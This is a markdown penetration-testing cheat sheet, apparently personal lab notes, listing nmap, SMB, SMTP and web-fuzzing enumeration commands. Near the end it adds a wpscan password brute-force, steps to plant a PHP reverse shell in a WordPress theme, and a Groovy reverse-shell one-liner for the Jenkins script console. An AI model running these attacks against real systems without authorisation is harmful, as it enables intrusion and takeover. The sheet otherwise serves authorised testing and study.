# Enumeration
* [Host Discovery](#Host-Discovery)
* [Services](#Services)
     * [Most common ports](#Most-common-ports)
     * [Port Scanning Nmap](#port-scanning-Nmap)
     * [SMTP](#SMTP)
     * [SMB](#SMB)
     * [RPC](#RPC)
* [Web-applications](#Web-applications)
     * [Vulnerability Scanning](#Vulnerability-scanning)
     * [Directory fuzzing](#Directory-fuzzing)

## Host Discovery
#### NMAP ping sweep
```
sudo nmap -sn <RANGE>
```

#### Netdiscover
```
sudo netdiscover -r <RANGE>
sudo netdisover -i <INTERFACE>
```

## Services
### Most common ports
```
21: ftp
22: ssh
23: telnet
25: smtp
53: domain name system
80: http
110: pop3
111: rpcbind
135: msrpc
139: netbios-ssn
143: imap
443: https
445: microsoft-ds
993: imaps
995: pop3s
1723: pptp
3306: mysql
3389: ms-wbt-server
5900: vnc
8080: http-proxy
```

### Port scanning Nmap
#### Full TCP port scan
```
nmap <TARGET> -sV -sC -O -p- -vv -oA fulltcp_<TARGET> 
```

#### Full UDP port scan
```
nmap <TARGET> -sU -sV -sC -p- -vv -oA fulludp_<TARGET> 
```

#### Nmap scan most common ports wiht no host discovery
```
nmap <TARGET> -p 20,21,22,25,80,443,111,135,139,443,8080 -oA portsweep_<TARGET> 
nmap <TARGET> --top-ports 25 -oA portsweep_top25_<TARGET> 
```

#### Nmap scan all vulnerabilities
```
nmap <TARGET> -p- --script vuln -vv -oA vulnscan_<TARGET> 
```

#### Usefull flags
- ```-Pn``` No ping #use if host says down but you know its up)
- ```-sn``` No port scan #use if you just want to scan a range to check if hosts are up.

#### HTTP Openproxy
If there is an open HTTP proxy, connect to it by configuring a proxy in your browser.

## Autorecon
https://github.com/Tib3rius/AutoRecon
```
autorecon -vv <IP>
```

### SMTP
#### Enumerate emails accounts
```
nc -nv <IP> 25
VRFY root
VRFY idontexist
Check output
```

### SMB 
https://book.hacktricks.xyz/pentesting/pentesting-smb

#### Get version script
https://github.com/unkn-0wn/SmbVersion
```
sudo python3 smbver.py <IP> <PORT>
```

#### Nmap enumerate SMB shares
```
nmap -p 139,445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>
nmap -p 139,445 --script=/usr/share/nmap/scripts/smb* <IP>
```

#### Enum4linux
Gotta try this: https://github.com/cddmp/enum4linux-ng
```
enum4linux <IP>
```

#### SMBClient list shares
```
smbclient -L <IP>
smbclient -L <IP>  -U '<USER>'%'<PASS>'
```

#### SMBClient connect to share
```
smbclient //<IP>/<SHARE>
```

#### Download smb files recursively
```
get <FILE NAME>-
smbget -R smb://<IP>/<SHARE>
```

#### SMBMap check access
```
smbmap -H <IP> -p 445 -u ''
```

#### Nbtscan
```
nbtscan <IP>
```

### RPC
#### Nmap enumerate RPC shares
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```

## Web-applications
- Check the file extensions in URL’s to see what the application is running (.net .aspx .php etc)
- Inspect page content
- Check Firefox debugger for outdated javascript libraries
- Look for /robots.txt and /sitemap.xml

#### Find subdomains from html pages
```
curl <WEBPAGE>
grep -o '[^/]*\.<DOMAIN>\.com' index.html | sort -u > subdomains.txt
```

#### Screenshot a lot of http pages
Collect screenshot from list of ips
```
for ip in $(cat <IP FILE>); do cutycapt --url=$ip --out=$ip.png;done
```

Run the following bash script
```
#!/bin/bash
# Bash script to examine the scan results through HTML.
echo "<HTML><BODY><BR>" > web.html
ls -1 *.png | awk -F : '{ print $1":\n<BR><IMG SRC=\""$1""$2"\" width=600><BR>"}' >> w
eb.html
echo "</BODY></HTML>" >> web.html
```

### Vulnerability scanning
#### Nikto
```
nikto -host <URL> -output nikto-URL.txt
```

### Directory fuzzing
#### Dirb parameters
- ```-R``` to disable recursive scanning
- ```-p``` set up a proxy <IP:PORT>
- ```-X``` Append each word with this extensions.

#### Dirb Quick scan
```
dirb <URL> /usr/share/dirb/wordlists/big.txt -o dirb-<URL>.txt
```

#### Dirb Big wordlist
```
dirb <URL> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o dirb-<URL>.txt
```

#### Gobuster parameters
- use the ```-b``` flag to blacklist status codes.
- Use the ```-x``` flag to add file extensions.

#### Gobuster Quick scan
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -u <URL> gobuster-<URL>.txt
```

#### Gobuster Big wordlist
```
gobuster dir -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <URL> gobuster-<URL>.txt
```

### Wordpress
#### Scan Wordpress
```
wpscan -url <URL>
```

#### Bruteforce login
```
wpscan --url <URL> --usernames <USERNAME> --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

#### Upload a reveare shell
1. Login --> Appearance --> Theme editor --> 404.php
2. gedit /usr/share/webshells/php/php-reverse-shell.php
3. Paste in 404.php
4. Start listener and go to an unexisting page in the browser

### Jenkings
#### Execute commands
- After login go to /script

#### Reverse java shell
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### General
#### Find dangerous HTTP methods
https://www.sans.org/reading-room/whitepapers/testing/penetration-testing-web-application-dangerous-http-methods-33945
```
curl -v -X OPTIONS http://website/directory
#HTTP options such as PUT, Delete are bad
```
